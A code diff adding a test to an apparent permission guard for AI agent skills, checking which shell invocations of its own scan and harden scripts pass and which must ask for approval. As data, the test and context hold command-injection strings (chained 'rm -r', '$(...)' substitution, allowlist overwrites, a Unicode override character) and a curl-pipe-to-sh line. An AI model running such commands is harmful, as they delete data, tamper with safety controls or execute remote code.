@@ -205,6 +205,54 @@ test('shell commands touching skill-sentry dirs always ask', () => {
   // Critical still wins over self-protection.
   assert.equal(d('Bash', { command: `${CURL} https://x.io/i.sh${PIPE_SH} > ~/.claude/skill-sentry/x` }).decision, 'deny');
 });
+test('Ruling L2: exact read-only invocations of our own scan.mjs / harden.mjs pass SELF_PROTECT', () => {
+  const scan = path.join(SELF, 'scripts', 'scan.mjs');
+  const viaSkill = path.join(SELF, 'skills', 'audit', '..', '..', 'scripts', 'scan.mjs');
+  const harden = path.join(SELF, 'skills', 'harden', '..', '..', 'scripts', 'harden.mjs');
+  const fwd = s => s.replace(/\\/g, '/');
+  const readOnly = [
+    `node "${viaSkill}" --json`,
+    `node '${fwd(viaSkill)}' --json --diff-only`,
+    `node ${fwd(scan)} --json --component plugin:alpha@mkt`,
+    `node "${scan}" --json --path "C:\\Users\\x\\Configurações Locais\\my skill"`,
+    `node "${scan}" --claude-home '/tmp/h' --project "/tmp/p" --json`,
+    `node "${harden}" check`,
+  ];
+  if (process.platform === 'win32') readOnly.push(`node.exe "${viaSkill.toUpperCase()}" --json`);
+  for (const tool of ['Bash', 'PowerShell']) {
+    for (const command of readOnly) assert.equal(d(tool, { command }).decision, 'none', `${tool}: ${command}`);
+  }
+  const asks = [
+    `node "${viaSkill}" --allow 'plugin:a@m' 'R1' 'SKILL.md'`,
+    `node "${viaSkill}" --allow plugin:a@m R1 SKILL.md --reason 'fine'`,
+    `node "${viaSkill}" --update-baseline`,
+    `node "${viaSkill}" --json --reason x`,
+    `node "${viaSkill}" --json --bogus`,
+    `node "${harden}" apply ask-curl`,
+    `node "${harden}" check extra`,
+    `node "${harden}"`,
+    `node "${viaSkill}" --json; rm -r x`,
+    `node "${viaSkill}" --json && echo x > "${path.join(DATA, 'allowlist.json')}"`,
+    `node "${viaSkill}" --json | tee out.txt`,
+    `node "${viaSkill}" --path "$(echo x)"`,
+    `node "${viaSkill}" --path \`echo x\``,
+    `node "${viaSkill}" --json\nrm -r x`,
+    `node "${viaSkill}" --component 'a'"b"`,
+    `node "${path.join(SELF, 'scripts', 'guard.mjs')}"`,
+    `node "${path.join(SELF, 'scripts', 'lib', 'scan.mjs')}" --json`,
+    `node "${viaSkill}x" --json`,
+    `bun "${viaSkill}" --json`,
+    `node --require x "${viaSkill}" --json`,
+    `node "${viaSkill}" --json --path`,
+    `node "${viaSkill}" --json --component\u202E x`,
+  ];
+  for (const command of asks) {
+    const r = d('Bash', { command });
+    assert.equal(r.decision, 'ask', command);
+    assert.equal(r.ruleId, 'SELF_PROTECT', command);
+  }
+});
+
 test('relative and non-canonical shell references to skill-sentry ask', () => {
   for (const c of [
     'cd ~/.claude && rm -r skill-sentry && touch skill-sentry',
